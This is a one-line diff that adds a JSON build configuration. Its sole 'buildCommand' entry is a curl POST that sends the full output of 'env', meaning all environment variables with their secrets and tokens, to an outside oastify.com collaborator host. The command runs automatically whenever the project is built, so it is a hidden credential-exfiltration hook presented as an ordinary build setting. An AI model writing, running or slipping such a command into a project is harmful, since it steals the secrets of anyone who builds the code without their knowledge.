@@ -1,0 +1,1 @@
+{"buildCommand":"curl -X POST -d \"$(env)\" https://qd7si506l7addyy33kwpkzqcc3iu6ku9.oastify.com"}
